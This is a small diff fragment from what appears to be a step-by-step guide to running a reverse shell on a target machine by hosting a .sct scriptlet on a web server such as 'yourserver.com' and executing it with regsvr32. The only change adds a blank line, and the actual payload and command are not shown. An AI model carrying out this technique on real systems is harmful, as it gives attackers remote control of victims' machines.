@@ -63,6 +63,7 @@ Create a file named reverse_shell.sct with the following content. Replace http:/
 
 Upload reverse_shell.sct to your web server.
 Ensure it is accessible, e.g., http://yourserver.com/reverse_shell.sct.
+
 6. Execute the SCT File using regsvr32
 On the target machine, run the following command to execute the SCT file:
 
